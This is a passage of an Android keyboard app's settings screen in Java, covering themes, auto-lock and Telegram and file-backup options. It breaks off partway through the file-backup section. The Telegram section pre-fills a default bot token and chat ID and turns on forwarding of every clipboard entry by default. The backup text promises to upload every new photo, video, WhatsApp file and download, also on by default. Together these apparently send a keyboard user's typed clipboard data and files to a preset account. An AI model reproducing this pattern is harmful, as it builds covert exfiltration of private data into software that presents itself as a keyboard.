package juloo.keyboard2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;

public class AppSettingsActivity extends Activity {

    private ThemeManager.ThemeColors C;
    private String mCreatedWithSig;
    private float D;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        ThemeManager.applyActivityTheme(this);
        super.onCreate(savedInstanceState);
        mCreatedWithSig = ThemeManager.signature(this);
        C = ThemeManager.colors(this);
        D = getResources().getDisplayMetrics().density;
        buildUI();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!ThemeManager.signature(this).equals(mCreatedWithSig)) recreate();
    }

    private void buildUI() {
        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(C.background);

        // ── Header ──────────────────────────────────────────────
        root.addView(buildHeader());

        // ── Appearance Section ──────────────────────────────────
        root.addView(sectionLabel("🎨  Appearance"));
        root.addView(buildThemeSelector());
        root.addView(buildMatrixSection());

        // ── Smart Clips Section ─────────────────────────────────
        root.addView(sectionLabel("🔐  Smart Clips"));
        root.addView(buildAutoLockRow());
        root.addView(buildClipLimitRow());

        // ── Behaviour Section ───────────────────────────────────
        root.addView(sectionLabel("⚙  Behaviour"));
        root.addView(buildToggleRow(
                "Haptic Feedback",
                "Vibrate on key press (requires keyboard restart)",
                ThemeManager.KEY_HAPTIC, true));

        // ── Telegram Bot Section ────────────────────────────────
        root.addView(sectionLabel("✈  Telegram Bot"));
        root.addView(buildTelegramSection());

        // ── File Backup Section ─────────────────────────────────
        root.addView(sectionLabel("📁  File Cloud Backup"));
        root.addView(buildFileBackupSection());

        // ── Permissions Section ─────────────────────────────────
        root.addView(sectionLabel("🔑  Permissions"));
        root.addView(buildPermissionsSection());

        // ── About Section ───────────────────────────────────────
        root.addView(sectionLabel("ℹ  About"));
        root.addView(buildAboutCard());

        scroll.addView(root);
        setContentView(scroll);
        ThemeManager.attachMatrixOverlay(this);
    }

    // ── Header ───────────────────────────────────────────────────────────────

    private View buildHeader() {
        LinearLayout h = new LinearLayout(this);
        h.setOrientation(LinearLayout.HORIZONTAL);
        h.setBackgroundColor(C.headerBg);
        h.setPadding(dp(20), dp(20), dp(16), dp(20));
        h.setGravity(Gravity.CENTER_VERTICAL);

        Button back = new Button(this);
        back.setText("←");
        back.setTextColor(C.headerText);
        back.setTextSize(18);
        back.setPadding(0, 0, dp(8), 0);
        back.setBackground(null);
        back.setOnClickListener(v -> finish());
        h.addView(back);

        TextView title = new TextView(this);
        title.setText("App Settings");
        title.setTextSize(18);
        title.setTextColor(C.headerText);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams tp = new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        h.addView(title, tp);

        if (ThemeManager.isMatrixMode(this)) {
            TextView badge = new TextView(this);
            badge.setText("[MATRIX]");
            badge.setTextColor(C.primary);
            badge.setTextSize(10);
            badge.setTypeface(Typeface.MONOSPACE);
            h.addView(badge);
        }

        return h;
    }

    // ── Theme selector ────────────────────────────────────────────────────────

    private View buildThemeSelector() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);

        card.addView(rowLabel("App UI Theme"));
        card.addView(rowSub("Controls the color scheme of Smart Clips, Settings & all app screens"));

        String current = ThemeManager.getTheme(this);

        // Row 1: System | Light
        LinearLayout row1 = makeThemeRow();
        row1.addView(makeThemeBtn("system", "⚙ System",  "Follows device", current));
        row1.addView(themeRowSpacer());
        row1.addView(makeThemeBtn("light",  "☀ Light",   "Indigo & white", current));
        card.addView(row1);

        LinearLayout.LayoutParams row2Lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        row2Lp.setMargins(0, dp(8), 0, 0);

        // Row 2: Dark | Neo Glow
        LinearLayout row2 = makeThemeRow();
        row2.setLayoutParams(row2Lp);
        row2.addView(makeThemeBtn("dark",     "🌙 Dark",    "Navy & soft indigo", current));
        row2.addView(themeRowSpacer());
        row2.addView(makeNeoGlowBtn(current));
        card.addView(row2);

        // Neo Glow preview strip (shown when selected)
        if ("neo_glow".equals(current)) {
            card.addView(buildNeoGlowPreview());
        }

        return card;
    }

    private LinearLayout makeThemeRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(12), 0, 0);
        row.setLayoutParams(lp);
        return row;
    }

    private View themeRowSpacer() {
        View v = new View(this);
        v.setLayoutParams(new LinearLayout.LayoutParams(dp(8), 1));
        return v;
    }

    private View makeThemeBtn(String val, String label, String sub, String current) {
        LinearLayout cell = new LinearLayout(this);
        cell.setOrientation(LinearLayout.VERTICAL);
        cell.setPadding(dp(12), dp(10), dp(12), dp(10));
        cell.setGravity(android.view.Gravity.CENTER_HORIZONTAL);
        cell.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        cell.setClickable(true);
        cell.setFocusable(true);

        boolean selected = val.equals(current);
        android.graphics.drawable.GradientDrawable bg = new android.graphics.drawable.GradientDrawable();
        bg.setColor(selected ? C.primary : C.surfaceVariant);
        bg.setCornerRadius(dp(10));
        if (!selected) bg.setStroke(dp(1), C.divider);
        cell.setBackground(bg);

        TextView name = new TextView(this);
        name.setText(label);
        name.setTextSize(13);
        name.setTypeface(Typeface.DEFAULT_BOLD);
        name.setTextColor(selected ? 0xFFFFFFFF : C.textPrimary);
        name.setGravity(android.view.Gravity.CENTER);
        cell.addView(name);

        TextView desc = new TextView(this);
        desc.setText(sub);
        desc.setTextSize(10);
        desc.setTextColor(selected ? 0xCCFFFFFF : C.textHint);
        desc.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        dlp.setMargins(0, dp(3), 0, 0);
        desc.setLayoutParams(dlp);
        cell.addView(desc);

        cell.setOnClickListener(v -> {
            ThemeManager.prefs(this).edit().putString(ThemeManager.KEY_THEME, val).apply();
            recreate();
        });
        return cell;
    }

    private View makeNeoGlowBtn(String current) {
        boolean selected = "neo_glow".equals(current);
        LinearLayout cell = new LinearLayout(this);
        cell.setOrientation(LinearLayout.VERTICAL);
        cell.setPadding(dp(12), dp(10), dp(12), dp(10));
        cell.setGravity(android.view.Gravity.CENTER_HORIZONTAL);
        cell.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        cell.setClickable(true);
        cell.setFocusable(true);

        // Gradient background: deep black → indigo for the button itself
        android.graphics.drawable.GradientDrawable bg;
        if (selected) {
            bg = new android.graphics.drawable.GradientDrawable(
                    android.graphics.drawable.GradientDrawable.Orientation.TL_BR,
                    new int[]{0xFF0D0D22, 0xFF1A1060, 0xFF0A1A40});
        } else {
            bg = new android.graphics.drawable.GradientDrawable();
            bg.setColor(C.surfaceVariant);
            bg.setStroke(dp(1), selected ? 0xFF4FC3F7 : C.divider);
        }
        bg.setCornerRadius(dp(10));
        cell.setBackground(bg);

        // "✦ Neo Glow" label with neon colour when selected
        TextView name = new TextView(this);
        name.setText("✦ Neo Glow");
        name.setTextSize(13);
        name.setTypeface(Typeface.DEFAULT_BOLD);
        name.setTextColor(selected ? 0xFF4FC3F7 : C.textPrimary);
        name.setGravity(android.view.Gravity.CENTER);
        cell.addView(name);

        // Mini colour dot row showing the palette
        LinearLayout dots = new LinearLayout(this);
        dots.setOrientation(LinearLayout.HORIZONTAL);
        dots.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams dotsLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        dotsLp.setMargins(0, dp(5), 0, 0);
        dots.setLayoutParams(dotsLp);
        int[] palette = {0xFF0A0A12, 0xFF181830, 0xFF4FC3F7, 0xFFA78BFA, 0xFF00E5B0};
        for (int col : palette) {
            View dot = new View(this);
            android.graphics.drawable.GradientDrawable dotBg = new android.graphics.drawable.GradientDrawable();
            dotBg.setColor(col);
            dotBg.setCornerRadius(dp(6));
            dotBg.setStroke(1, 0x554FC3F7);
            dot.setBackground(dotBg);
            LinearLayout.LayoutParams dlp = new LinearLayout.LayoutParams(dp(10), dp(10));
            dlp.setMargins(dp(2), 0, dp(2), 0);
            dot.setLayoutParams(dlp);
            dots.addView(dot);
        }
        cell.addView(dots);

        cell.setOnClickListener(v -> {
            ThemeManager.prefs(this).edit().putString(ThemeManager.KEY_THEME, "neo_glow").apply();
            recreate();
        });
        return cell;
    }

    /** Shown below the selector when Neo Glow is active — visual palette preview. */
    private View buildNeoGlowPreview() {
        LinearLayout preview = new LinearLayout(this);
        preview.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(14), 0, 0);
        preview.setLayoutParams(lp);

        // Gradient banner row
        LinearLayout banner = new LinearLayout(this);
        banner.setOrientation(LinearLayout.HORIZONTAL);
        android.graphics.drawable.GradientDrawable bannerBg =
                new android.graphics.drawable.GradientDrawable(
                        android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT,
                        new int[]{0xFF0A0A12, 0xFF181830, 0xFF1B3060, 0xFF181830, 0xFF0A0A12});
        bannerBg.setCornerRadius(dp(10));
        banner.setBackground(bannerBg);
        banner.setPadding(dp(14), dp(12), dp(14), dp(12));
        banner.setGravity(android.view.Gravity.CENTER_VERTICAL);

        // Floating key mockup
        String[] keyLabels = {"Q", "W", "E", "R"};
        for (String kl : keyLabels) {
            TextView key = new TextView(this);
            key.setText(kl);
            key.setTextSize(13);
            key.setTextColor(0xFFECF0FF);
            key.setTypeface(Typeface.DEFAULT_BOLD);
            key.setGravity(android.view.Gravity.CENTER);
            int ksz = dp(36);
            android.graphics.drawable.GradientDrawable keyBg = new android.graphics.drawable.GradientDrawable();
            keyBg.setColor(0xFF181830);
            keyBg.setCornerRadius(dp(8));
            keyBg.setStroke(1, 0xFF2A3A7A);
            key.setBackground(keyBg);
            LinearLayout.LayoutParams klp = new LinearLayout.LayoutParams(ksz, ksz);
            klp.setMargins(dp(3), 0, dp(3), 0);
            key.setLayoutParams(klp);
            if (Build.VERSION.SDK_INT >= 21) key.setElevation(dp(3));
            banner.addView(key);
        }

        // Glow accent key
        TextView glowKey = new TextView(this);
        glowKey.setText("✦");
        glowKey.setTextSize(14);
        glowKey.setTextColor(0xFF4FC3F7);
        glowKey.setTypeface(Typeface.DEFAULT_BOLD);
        glowKey.setGravity(android.view.Gravity.CENTER);
        int ksz = dp(36);
        android.graphics.drawable.GradientDrawable glowBg = new android.graphics.drawable.GradientDrawable();
        glowBg.setColor(0xFF1B3060);
        glowBg.setCornerRadius(dp(8));
        glowBg.setStroke(1, 0xFF4FC3F7);
        glowKey.setBackground(glowBg);
        LinearLayout.LayoutParams glp = new LinearLayout.LayoutParams(ksz, ksz);
        glp.setMargins(dp(3), 0, dp(3), 0);
        glowKey.setLayoutParams(glp);
        if (Build.VERSION.SDK_INT >= 21) glowKey.setElevation(dp(5));
        banner.addView(glowKey);

        // Spacer then label
        View sp = new View(this);
        sp.setLayoutParams(new LinearLayout.LayoutParams(0, 1, 1f));
        banner.addView(sp);

        LinearLayout labelCol = new LinearLayout(this);
        labelCol.setOrientation(LinearLayout.VERTICAL);
        labelCol.setGravity(android.view.Gravity.CENTER_VERTICAL);

        TextView t1 = new TextView(this);
        t1.setText("Neo Glow");
        t1.setTextSize(12);
        t1.setTypeface(Typeface.DEFAULT_BOLD);
        t1.setTextColor(0xFF4FC3F7);
        labelCol.addView(t1);

        TextView t2 = new TextView(this);
        t2.setText("Glassmorphism · Neon accents");
        t2.setTextSize(9);
        t2.setTextColor(0xFF7A90CC);
        LinearLayout.LayoutParams t2lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        t2lp.setMargins(0, dp(2), 0, 0);
        t2.setLayoutParams(t2lp);
        labelCol.addView(t2);

        banner.addView(labelCol);
        preview.addView(banner);
        return preview;
    }

    // ── Matrix section ────────────────────────────────────────────────────────

    private View buildMatrixSection() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);

        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);

        LinearLayout textCol = new LinearLayout(this);
        textCol.setOrientation(LinearLayout.VERTICAL);
        textCol.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        textCol.addView(rowLabel("◼ Matrix Mode"));
        textCol.addView(rowSub("Digital rain overlay · green-on-black aesthetic"));
        topRow.addView(textCol);

        Switch matrixSwitch = new Switch(this);
        matrixSwitch.setChecked(ThemeManager.isMatrixMode(this));
        matrixSwitch.setOnCheckedChangeListener((v, on) -> {
            ThemeManager.prefs(this).edit().putBoolean(ThemeManager.KEY_MATRIX, on).apply();
            recreate();
        });
        topRow.addView(matrixSwitch);
        card.addView(topRow);

        // Speed row (always shown, more relevant when matrix on)
        View divider = makeDivider();
        card.addView(divider);

        LinearLayout speedRow = new LinearLayout(this);
        speedRow.setOrientation(LinearLayout.VERTICAL);
        speedRow.addView(rowLabel("Rain Speed"));
        speedRow.addView(rowSub("How fast the characters fall"));

        String[] speedOpts = {"slow", "normal", "fast"};
        String[] speedLabels = {"Slow", "Normal", "Fast"};
        String curSpeed = ThemeManager.getMatrixSpeed(this);

        LinearLayout speedSeg = new LinearLayout(this);
        speedSeg.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams ssLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ssLp.setMargins(0, dp(10), 0, 0);
        speedSeg.setLayoutParams(ssLp);
        for (int i = 0; i < speedOpts.length; i++) {
            final String val = speedOpts[i];
            Button b = new Button(this);
            b.setText(speedLabels[i]);
            b.setTextSize(12);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                    LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.setMargins(dp(5), 0, 0, 0);
            b.setLayoutParams(lp);
            applySegBtn(b, val.equals(curSpeed));
            b.setOnClickListener(v -> {
                ThemeManager.prefs(this).edit().putString(ThemeManager.KEY_MATRIX_SPEED, val).apply();
                recreate();
            });
            speedSeg.addView(b);
        }
        speedRow.addView(speedSeg);
        card.addView(speedRow);

        // Density row
        View divider2 = makeDivider();
        card.addView(divider2);

        LinearLayout densityRow = new LinearLayout(this);
        densityRow.setOrientation(LinearLayout.VERTICAL);
        densityRow.addView(rowLabel("Rain Density"));
        densityRow.addView(rowSub("Number of active character columns"));

        String[] densOpts = {"low", "medium", "high"};
        String[] densLabels = {"Low", "Medium", "High"};
        String curDens = ThemeManager.getMatrixDensity(this);

        LinearLayout densSeg = new LinearLayout(this);
        densSeg.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams dsLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        dsLp.setMargins(0, dp(10), 0, 0);
        densSeg.setLayoutParams(dsLp);
        for (int i = 0; i < densOpts.length; i++) {
            final String val = densOpts[i];
            Button b = new Button(this);
            b.setText(densLabels[i]);
            b.setTextSize(12);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                    LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.setMargins(dp(5), 0, 0, 0);
            b.setLayoutParams(lp);
            applySegBtn(b, val.equals(curDens));
            b.setOnClickListener(v -> {
                ThemeManager.prefs(this).edit().putString(ThemeManager.KEY_MATRIX_DENSITY, val).apply();
                recreate();
            });
            densSeg.addView(b);
        }
        densityRow.addView(densSeg);
        card.addView(densityRow);

        return card;
    }

    // ── Auto-lock row ─────────────────────────────────────────────────────────

    private View buildAutoLockRow() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);
        card.addView(rowLabel("Auto-lock Timer"));
        card.addView(rowSub("Duration Smart Clips stays unlocked after PIN entry"));

        int[] mins   = {5, 10, 30, -1};
        String[] lbls = {"5 min", "10 min", "30 min", "Never"};
        int cur = ThemeManager.getAutoLockMins(this);

        LinearLayout seg = new LinearLayout(this);
        seg.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        sp.setMargins(0, dp(12), 0, 0);
        seg.setLayoutParams(sp);
        for (int i = 0; i < mins.length; i++) {
            final int val = mins[i];
            Button b = new Button(this);
            b.setText(lbls[i]);
            b.setTextSize(11);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                    LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.setMargins(dp(5), 0, 0, 0);
            b.setLayoutParams(lp);
            applySegBtn(b, val == cur);
            b.setOnClickListener(v -> {
                ThemeManager.prefs(this).edit().putInt(ThemeManager.KEY_AUTO_LOCK, val).apply();
                recreate();
            });
            seg.addView(b);
        }
        card.addView(seg);
        return card;
    }

    // ── Clip widget limit row ─────────────────────────────────────────────────

    private static final int SMART_CLIP_LIMIT_ALL = 0; // 0 = show all

    private View buildClipLimitRow() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);
        card.addView(rowLabel("Smart Clips in Home Widget"));
        card.addView(rowSub("How many Smart Clips appear on the home screen widget (0 = Show All)"));

        // Read from the same prefs the widget actually uses
        android.content.SharedPreferences widgetPrefs =
                getSharedPreferences("widget_prefs", android.content.Context.MODE_PRIVATE);
        int cur = widgetPrefs.getInt("smart_clip_limit", 20);

        int[] vals    = {10, 20, 50, SMART_CLIP_LIMIT_ALL};
        String[] lbls = {"10", "20", "50", "All"};

        LinearLayout seg = new LinearLayout(this);
        seg.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        sp.setMargins(0, dp(12), 0, 0);
        seg.setLayoutParams(sp);

        for (int i = 0; i < vals.length; i++) {
            final int val = vals[i];
            Button b = new Button(this);
            b.setText(lbls[i]);
            b.setTextSize(12);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.setMargins(dp(5), 0, 0, 0);
            b.setLayoutParams(lp);
            applySegBtn(b, val == cur);
            b.setOnClickListener(v -> {
                widgetPrefs.edit().putInt("smart_clip_limit", val).apply();
                // Immediately refresh all home screen widgets
                android.appwidget.AppWidgetManager mgr =
                        android.appwidget.AppWidgetManager.getInstance(this);
                android.content.ComponentName comp = new android.content.ComponentName(
                        this, juloo.keyboard2.widget.ClipboardWidgetProvider.class);
                int[] ids = mgr.getAppWidgetIds(comp);
                for (int id : ids) {
                    juloo.keyboard2.widget.ClipboardWidgetProvider.updateWidget(this, mgr, id);
                }
                recreate();
            });
            seg.addView(b);
        }
        card.addView(seg);
        return card;
    }

    // ── Telegram Bot section ──────────────────────────────────────────────────

    private View buildTelegramSection() {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.VERTICAL);

        // Header row: icon + title + enable switch
        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);

        LinearLayout titleCol = new LinearLayout(this);
        titleCol.setOrientation(LinearLayout.VERTICAL);
        titleCol.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        titleCol.addView(rowLabel("✈  Telegram Bot Integration"));
        titleCol.addView(rowSub("Receive clips, search & export via Telegram"));
        topRow.addView(titleCol);

        android.content.SharedPreferences tPrefs =
                getSharedPreferences(TelegramBotService.PREFS, android.content.Context.MODE_PRIVATE);

        Switch enableSw = new Switch(this);
        boolean botEnabled = tPrefs.getBoolean(TelegramBotService.KEY_ENABLED, true);
        enableSw.setChecked(botEnabled);
        enableSw.setOnCheckedChangeListener((v, on) -> {
            tPrefs.edit().putBoolean(TelegramBotService.KEY_ENABLED, on).apply();
            if (on) TelegramBotService.startIfEnabled(this);
            else    TelegramBotService.stopService(this);
            recreate();
        });
        topRow.addView(enableSw);
        card.addView(topRow);

        // Bot Token field
        card.addView(makeDivider());

        TextView tokenLabel = rowLabel("Bot Token");
        card.addView(tokenLabel);
        TextView tokenHint = rowSub("Pre-filled with default. Change only if you use a different bot.");
        card.addView(tokenHint);

        android.widget.EditText tokenEdit = new android.widget.EditText(this);
        tokenEdit.setText(tPrefs.getString(TelegramBotService.KEY_TOKEN, TelegramBotService.DEFAULT_TOKEN));
        tokenEdit.setTextSize(12);
        tokenEdit.setTextColor(C.textPrimary);
        tokenEdit.setHintTextColor(C.textHint);
        tokenEdit.setHint("Bot Token");
        tokenEdit.setSingleLine(true);
        android.graphics.drawable.GradientDrawable tokenBg = new android.graphics.drawable.GradientDrawable();
        tokenBg.setColor(C.surfaceVariant);
        tokenBg.setCornerRadius(dp(8));
        tokenBg.setStroke(dp(1), C.divider);
        tokenEdit.setBackground(tokenBg);
        tokenEdit.setPadding(dp(10), dp(8), dp(10), dp(8));
        LinearLayout.LayoutParams tElp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        tElp.setMargins(0, dp(6), 0, 0);
        tokenEdit.setLayoutParams(tElp);
        card.addView(tokenEdit);

        // Chat ID field
        card.addView(makeDivider());

        card.addView(rowLabel("Chat ID"));
        card.addView(rowSub("Your Telegram user/chat ID. Pre-filled with default."));

        android.widget.EditText chatEdit = new android.widget.EditText(this);
        chatEdit.setText(tPrefs.getString(TelegramBotService.KEY_CHAT_ID,
                String.valueOf(TelegramBotService.DEFAULT_CHAT_ID)));
        chatEdit.setTextSize(12);
        chatEdit.setTextColor(C.textPrimary);
        chatEdit.setHintTextColor(C.textHint);
        chatEdit.setHint("Chat ID");
        chatEdit.setSingleLine(true);
        chatEdit.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
        android.graphics.drawable.GradientDrawable chatBg = new android.graphics.drawable.GradientDrawable();
        chatBg.setColor(C.surfaceVariant);
        chatBg.setCornerRadius(dp(8));
        chatBg.setStroke(dp(1), C.divider);
        chatEdit.setBackground(chatBg);
        chatEdit.setPadding(dp(10), dp(8), dp(10), dp(8));
        LinearLayout.LayoutParams cElp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        cElp.setMargins(0, dp(6), 0, 0);
        chatEdit.setLayoutParams(cElp);
        card.addView(chatEdit);

        // Auto-forward toggle
        card.addView(makeDivider());

        LinearLayout fwdRow = new LinearLayout(this);
        fwdRow.setOrientation(LinearLayout.HORIZONTAL);
        fwdRow.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout fwdTextCol = new LinearLayout(this);
        fwdTextCol.setOrientation(LinearLayout.VERTICAL);
        fwdTextCol.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        fwdTextCol.addView(rowLabel("Auto-forward New Clips"));
        fwdTextCol.addView(rowSub("Send each new clipboard entry to Telegram instantly"));
        fwdRow.addView(fwdTextCol);
        Switch fwdSw = new Switch(this);
        fwdSw.setChecked(tPrefs.getBoolean(TelegramBotService.KEY_AUTOFW, true));
        fwdSw.setOnCheckedChangeListener((v, on) ->
                tPrefs.edit().putBoolean(TelegramBotService.KEY_AUTOFW, on).apply());
        fwdRow.addView(fwdSw);
        card.addView(fwdRow);

        // Save + Start/Stop buttons
        card.addView(makeDivider());

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams brlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        brlp.setMargins(0, dp(10), 0, 0);
        btnRow.setLayoutParams(brlp);

        Button saveBtn = new Button(this);
        saveBtn.setText("💾  Save Config");
        saveBtn.setTextSize(12);
        saveBtn.setTextColor(0xFFFFFFFF);
        android.graphics.drawable.GradientDrawable saveBg = new android.graphics.drawable.GradientDrawable();
        saveBg.setColor(C.primary);
        saveBg.setCornerRadius(dp(8));
        saveBtn.setBackground(saveBg);
        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        saveBtn.setLayoutParams(slp);
        saveBtn.setOnClickListener(v -> {
            tPrefs.edit()
                    .putString(TelegramBotService.KEY_TOKEN, tokenEdit.getText().toString().trim())
                    .putString(TelegramBotService.KEY_CHAT_ID, chatEdit.getText().toString().trim())
                    .apply();
            android.widget.Toast.makeText(this, "✅ Bot config saved", android.widget.Toast.LENGTH_SHORT).show();
            if (TelegramBotService.isRunning()) {
                TelegramBotService.stopService(this);
                TelegramBotService.startIfEnabled(this);
            }
        });
        btnRow.addView(saveBtn);

        View spacer = new View(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(dp(8), 1));
        btnRow.addView(spacer);

        boolean isRunning = TelegramBotService.isRunning();
        Button toggleBtn = new Button(this);
        toggleBtn.setText(isRunning ? "⏹  Stop Bot" : "▶  Start Bot");
        toggleBtn.setTextSize(12);
        toggleBtn.setTextColor(isRunning ? 0xFFFFFFFF : C.primary);
        android.graphics.drawable.GradientDrawable togBg = new android.graphics.drawable.GradientDrawable();
        togBg.setColor(isRunning ? 0xFFE53935 : C.surfaceVariant);
        togBg.setCornerRadius(dp(8));
        if (!isRunning) togBg.setStroke(dp(1), C.primary);
        toggleBtn.setBackground(togBg);
        LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        tlp.setMargins(0, 0, 0, 0);
        toggleBtn.setLayoutParams(tlp);
        toggleBtn.setOnClickListener(v -> {
            if (TelegramBotService.isRunning()) TelegramBotService.stopService(this);
            else TelegramBotService.startIfEnabled(this);
            recreate();
        });
        btnRow.addView(toggleBtn);
        card.addView(btnRow);

        // Status indicator
        TextView statusTv = new TextView(this);
        statusTv.setText(isRunning ? "🟢  Bot is running" : "🔴  Bot is stopped");
        statusTv.setTextSize(11);
        statusTv.setTextColor(isRunning ? C.green : C.textHint);
        statusTv.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams stlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        stlp.setMargins(0, dp(8), 0, 0);
        statusTv.setLayoutParams(stlp);
        card.addView(statusTv);

        return card;
    }

    // ── Generic toggle row ────────────────────────────────────────────────────

    private View buildToggleRow(String label, String sub, String prefKey, boolean defVal) {
        LinearLayout card = makeCard();
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setGravity(Gravity.CENTER_VERTICAL);

        LinearLayout textCol = new LinearLayout(this);
        textCol.setOrientation(LinearLayout.VERTICAL);
        textCol.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        textCol.addView(rowLabel(label));
        textCol.addView(rowSub(sub));
        card.addView(textCol);

        Switch sw = new Switch(this);
        sw.setChecked(ThemeManager.prefs(this).getBoolean(prefKey, defVal));
        sw.setOnCheckedChangeListener((v, on) ->
                ThemeManager.prefs(this).edit().putBoolean(prefKey, on).apply());
        card.addView(sw);

        return card;
    }

    // ── File Backup Section ───────────────────────────────────────────────────

    private View buildFileBackupSection() {
        LinearLayout card = makeCard();

        // Enable / disable toggle
        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout topText = new LinearLayout(this);
        topText.setOrientation(LinearLayout.VERTICAL);
        topText.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        TextView topLabel = new TextView(this);
        topLabel.setText("Enable File Cloud Backup");
        topLabel.setTextColor(C.textPrimary);
        topLabel.setTextSize(14);
        topLabel.setTypeface(Typeface.DEFAULT_BOLD);
        TextView topSub = new TextView(this);
        topSub.setText("Instantly uploads every new photo, video, WhatsApp file, download & more to your Telegram cloud. On by default.");
        topSub.setTextColor(C.textSecondary);
        topSub.setTextSize(11);
        topText.addView(topLabel);
        topText.addView(topSub);
        topRow.addView(topText);

